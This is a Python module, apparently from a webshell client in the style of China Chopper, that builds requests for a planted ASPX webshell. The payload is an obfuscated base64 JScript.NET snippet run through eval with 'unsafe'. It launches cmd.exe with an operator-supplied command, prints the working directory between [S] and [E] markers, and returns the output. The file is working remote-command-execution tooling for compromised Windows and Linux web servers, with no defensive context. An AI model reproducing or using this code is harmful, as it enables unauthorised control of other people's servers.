#!/usr/bin/env python
# encoding: utf-8

import sys
sys.path.append('..')
from lib.core.payloader import Payloader

class AspxPayloader(Payloader):

    def parseCmd(self, osType, pwd, cmd, payload):
        if osType == 'windows':
            currentDirCmd = 'cd'
            divSymble = '&'
        else:
            currentDirCmd = 'pwd'
            divSymble = ';'
        cmd = 'cd ' + pwd + divSymble + cmd + divSymble + 'echo [S]' + divSymble + currentDirCmd + divSymble + 'echo [E]'
        cmd = cmd.encode('base64')
        payload['z2'] = cmd
        payload['z1'] = 'Y21k'
        payload['z0'] = 'var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System. Convert.FromBase64String("dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoyIl0pKTtlLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);};Response.End()'
        payload[self.password] = self.password +"=" + payload['z0'] + "&z1=" + payload['z1'] + "&z2=" + payload['z2']
